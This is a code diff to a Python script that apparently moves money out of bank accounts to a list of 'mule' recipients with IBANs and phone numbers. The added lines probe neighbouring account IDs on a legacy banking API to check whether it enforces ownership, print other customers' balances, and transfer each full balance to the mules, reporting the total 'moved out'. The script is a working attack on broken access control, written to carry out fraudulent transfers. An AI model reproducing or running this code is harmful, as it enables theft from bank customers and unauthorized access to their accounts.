@@ -93,6 +93,19 @@ def main():
             amount = extra[0]["balance"] / len(BIG_MULES)
             if send(bank, extra[0]["id"], name, iban, country, amount, a.pace, phone) is not None:
                 total += amount
+    say(f"{C}curious: does the legacy API check whose account it is? trying the neighbours of {acc['id']}...{X}", 0.6)
+    base = int(acc["id"].split("-")[1])
+    for n in range(base + 1, base + 4):
+        other = f"ACC-{n}"
+        r = bank.get(f"/v1/accounts/{other}/balance")
+        if r.status_code != 200:
+            say(f"  {other}: {r.status_code}", 0.2)
+            continue
+        bal = r.json()["balance"]
+        say(f"{B}{G}  {other}: someone else's account, AED {bal:,.2f} visible{X}", 0.3)
+        name, iban, country, phone = BIG_MULES[n % len(BIG_MULES)]
+        if bal > 0 and send(bank, other, name, iban, country, bal, a.pace, phone) is not None:
+            total += bal
     print(f"\n{B}{G}  DONE: AED {total:,.0f} moved out{X}\n")
 
 
